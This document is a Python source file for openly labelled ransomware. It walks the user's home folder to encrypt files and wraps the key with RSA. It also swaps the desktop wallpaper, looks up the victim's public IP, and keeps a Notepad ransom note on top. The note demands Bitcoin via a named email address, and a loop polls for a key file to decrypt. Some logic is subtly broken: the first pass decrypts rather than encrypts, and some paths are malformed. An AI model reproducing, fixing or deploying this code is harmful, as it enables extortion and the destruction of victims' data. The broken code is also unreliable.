import requests #get the ip address of a machine
from cryptography.fernet import Fernet
import os
import webbrowser #to load webbrowser to go to specific website to pay
import ctypes #change background on the windows machine
import urllib.request #go to specific website and grab a specific image
import time
import datetime
import subprocess # TO CREATE A PROCESS FOR NOTEPAD AND OPEN RANSOM NOTE
import win32gui # USED TO GET WINDOW TEXT TO SEE IF RANSOM NOTE IS ON TOP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading

class RansomWare:
    # File extensions to seek out and encrypt
    # THE FILES THAT ARE GOING TGO GET ENCD
    file_exts = [
        'txt',
        # We comment out 'jpg' so that we can see the Ransomware only encrypts specific files that we have chosen
        # and leaves other files un-encd etc
        # 'jpg'

    ]

    def __init__(self):
        # key that will be used for Fernet object and enc
        self.key = None
        self.crypter = None
        self.public_key = None

        self.sysRoot = os.path.expanduser('~')
        # use localroot to test enc software and for absolute path of files and snc the test system
        self.localRoot = r'C:\Users\Raymond\PycharmProjects\ransom' #debugging testing
        # Get public IP of person
        self.publicIP = requests.get('https://api.ipify.org').text

    # Generates key victim's machine which is used to encrypt the victims data
    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def write_key(self):
        with open('fernet_key.txt', 'wb')as f:
            f.write(self.key)

    def encrypt_fernet_key(self):
        with open('fernet_key.txt','rb')as f:
            fernet_key = f.read()

        with open('fernet_key.txt', 'wb')as f:
            self.public_key = RSA.import_key(open('public.pem').read())

            public_crypter = PKCS1_OAEP.new(self.public_key)

            enc_fernet_key = public_crypter.encrypt(fernet_key)

            f.write(enc_fernet_key)

        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt','wb')as fe:
            fe.write(enc_fernet_key)

        self.key = enc_fernet_key

        self.crypter = None


    def crypt_file(self,file_path,encrypted=False):
        with open(file_path, 'rb')as f:

            data = f.read()
            if not encrypted:
                print(data)

                _data = self.crypter.decrypt(data)

                print('>file decrypted')
                print(_data)
        with open(file_path, 'wb')as fp:
            fp.write(_data)


    def crypt_system(self, encrypted=False):
        system = os.walk(self.sysRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        webbrowser.open(url)

    def change_desktop_background(self):
        imageUrl = 'https://www.pexels.com/photo/brass-colored-metal-padlock-with-chain-4291/'

        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20

        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
        # time limit on teh date
        date = datetime.date.today().strftime('%d-%B-Y')

        with open('RANSOM_NOTE.txt', 'w')as f:
            f.write(
                f"""
                The harddisks of your Computer have been encrypted with Military Grade encryption algorithm.
                There is one way to restore your data without a special key.
                Only we can decrypt your files!
                
                To purchase your key and restore your data, please follow these easy steps:
                
                1. Email the file called EMAIL_ME.txt located in {self.sysRoot}Desktop/EMAIL_ME.txt to felirongo@gmail.com
                
                2. You will receive your personal BTC address for payment.
                    Once payment has been made, send another email to felirongo@gmail.com stating "PAID",
                    we will check to see if payment has been made.
                
                3. You will receive a text file with your KEY that will unlock all your files.
                    IMPORTANT: To decrypt, your files, place text file on desktop and wait.
                    Shortly after, it will begin to decrypt all the files.
                    
                WARNING!:
                DO not attempt to decrypt your files with any software as it is obsolete and will not work,
                this will cost you more to unlock your files forever.
                Do not send "PAID" button without paying. Price will go up for the disobedience.
                
                ASANTE!
                
                """
            )

    def show_ransom_note(self):

        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0
        while True:
            time.sleep(0.1)
            # we are getting the top window of the screen
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing')
                pass

            else:
                print('Ransom note is not the top window - Kill/create process again')
                time.sleep(0.1)
                ransom.kill()

                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])

            time.sleep(10)
            count += 1
            if count == 5:
                break


    def put_me_on_desktop(self):

        print('Started')
        while True:
            try:
                print('Trying')



                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)

                    self.crypt_system(encrypted=True)
                    print('decrypted')
                    break
            except Exception as e:
                print(e)
                pass
            time.sleep(120)
            print('Checking for PUT_ME_ON_DESKTOP.txt')


def main():

    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('>Ransomware: Attack completed on target')
    t2.start()
    print('>Ransomware: Completed')

if __name__ == '__main__':
    main()



